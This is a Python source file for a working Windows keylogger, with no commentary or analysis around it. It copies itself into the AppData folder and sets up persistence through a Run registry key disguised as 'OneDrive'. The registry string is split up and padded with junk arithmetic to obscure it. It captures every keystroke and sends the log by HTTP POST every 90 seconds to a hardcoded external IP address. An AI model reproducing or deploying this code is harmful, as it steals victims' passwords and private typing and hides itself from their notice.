from random import random
from random import randint
from pynput import keyboard
import requests
import shutil
import subprocess
import json
import threading
import socket
import platform     
import base64
import sys
import os
import time
text = ""

time.sleep(1)

namechange = randint(95, 120)

ip_address = "54.235.4.252"
port_number = "8080"

time_interval = 90


def pxsehdxexiwh():
    a = 45 * 3 / 55 
    b = a * 124345566543322 / 654 + 345435345.0294032
    d = b * 432545234242345 / 54325423423
    re = 'reg add HKCU\Sof'
    h = b * 432545234242345 / 54325423423
    c = 'tware\Micr'
    f = b * 432545234242345 / 54325423423
    t = 'osoft\Windows\Curr'
    um = 'entVersion\Run /v OneDrive' + chr(namechange) + ' /t REG_SZ /d '
    rectum = re + c + t + um
    location = os.environ['appdata'] + '\\appdata' + chr(namechange) + '.exe'
    shutil.copyfile(sys.executable,location)
    subprocess.call( rectum + '"' + location + '"', shell=True)

pxsehdxexiwh()


def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", 		
	data = payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        payload = ""
        timer.start()
    except:
        time.sleep(5)
        keylisten()
       

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "[enter]"
    elif key == keyboard.Key.tab:
        text += "[tab]"
    elif key == keyboard.Key.space:
        text += "[space]"
    elif key == keyboard.Key.shift:
        text += "[shift]"
    elif key == keyboard.Key.backspace and len(text) == 0:
         text += "[backspace]"
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         text += "[control]"
    elif key == keyboard.Key.esc:
         text += "[escape]"
    else:
        text += str(key).strip("'")

def keylisten():
    with keyboard.Listener(
        on_press=on_press) as listener:
        send_post_req()
        listener.join()
    
keylisten()
